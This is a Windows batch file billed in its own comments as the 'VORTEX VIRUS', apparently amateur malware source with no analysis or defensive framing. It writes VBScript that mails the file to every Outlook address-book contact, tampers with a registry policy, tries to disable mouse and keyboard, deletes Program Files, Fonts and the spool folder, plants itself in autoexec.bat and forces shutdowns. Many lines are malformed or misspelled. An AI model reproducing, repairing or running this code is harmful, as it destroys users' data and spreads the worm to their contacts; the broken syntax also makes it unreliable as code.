@echo off
echo Set WSHShell = CreateObject("WScript.Shell")>>c:\vortex.vbs>>c:\autoexec.bat
WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCloseKey", "1" >>c:\vortex.vbs>>c:\autoexec.bat
echo start c:\vortex.vbs>>c:\autoexec.bat
rem You Have Received The VORTEX VIRUS
rem Please wait paitiently untill the virus loads...
rem In a second you will be in the vortex...
rem START
c:\windows\rundll.exe mouse,disable >> autoexec.bat
c:\windows\rundll.exe keyboard,disable >> autoexec.bat 
echo Dim x >>c:\vortex1.vbs>>c:\autoexec.bat
echo on error resume next >>c:\vortex1.vbs>>c:\autoexec.bat
echo Set fso ="Scripting.FileSystemObject" >>c:\vortex1.vbs>>c:\autoexec.bat
echo Set so=CreateObject(fso) >>c:\vortex1.vbs>>c:\autoexec.bat
echo Set ol=CreateObject("Outlook.Application") >> >>c:\vortex1.vbs>>c:\autoexec.bat
echo Set out= WScript.CreateObject("Outlook.Application") >>c:\vortex1.vbs>>c:\autoexec.bat
echo Set mapi = out.GetNameSpace("MAPI") >>c:\vortex1.vbs>>c:\autoexec.bat
echo Set a = mapi.AddressLists(1) >>c:\vortex1.vbs>>c:\autoexec.bat
echo For x=1 To a.AddressEntries.Count>>c:\vortex1.vbs>>c:\autoexec.bat
echo Set Mail=ol.CreateItem(0) >> >>c:\vortex1.vbs>>c:\autoexec.bat
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >>c:\vortex1.vbs>>c:\autoexec.bat
echo Mail.Subject="URGENT!" >>c:\vortex1.vbs>>c:\autoexec.bat
echo Mail.Body="THIS FILE IS FOR YOUR EYES ONLY " >>c:\vortex1.vbs>>c:\autoexec.bat
echo Mail.Attachments.Add ("vortex.bat") >>c:\vortex1.vbs>>c:\autoexec.bat
echo Mail.Send >>c:\vortex1.vbs>>c:\autoexec.bat
echo Next >>c:\vortex1.vbs>>c:\autoexec.bat
echo ol.Quit >>c:\vortex1.vbs>>c:\autoexec.bat
goto  VORTEX

:VORTEX
md C:\windows\VORTEXXXX
copy %0 VORTEX.bat
md VORTEX >> autoexec.bat
copy %0 vortex.bat >> autoexec.bat
goto  DELETE

:DELETE
attrib -r c:\program file
RMDIR C:\program files
md C:\programe files
md C:\programe files\HAHA
md C:\programe files\HAHA\VIRUS
md C:\programe files\HAHA\VIRUS\NOTHING
if exist %windir%\fonts goto FONTS
if not exist %windir%\fonts goto EXIST

:FONTS
attrib -r %windir%\fonts
RMDIR %windir%\fonts

:EXIST
if exist C:\windows\system32\spool goto ENDING
in not exist C:\windows\system32\spool goto THE VORTEX

:ENDING
attrib -r %windir%\system32\
RD/s/q %windir%\system32\spool
:THE VORTEX
SHUTDOWN -s -t 20 >> autoexec.bat
goto END MESSAGE

:END MESSAGE
REM You have been infected by the VORTEX
REM what will happen is that every time
REM you open your computer , your mouse
REM wont work or your keyboard, the pc will
REM shutdown in 20 secs , and if you manage to
REM bypass everything else, your files have
REM been deleted! Also This will be sent to
REM all of your friends you have ever emailed
goto SHUTDOWN

:SHUTDOWN
SHUTDOWN -s -t 01

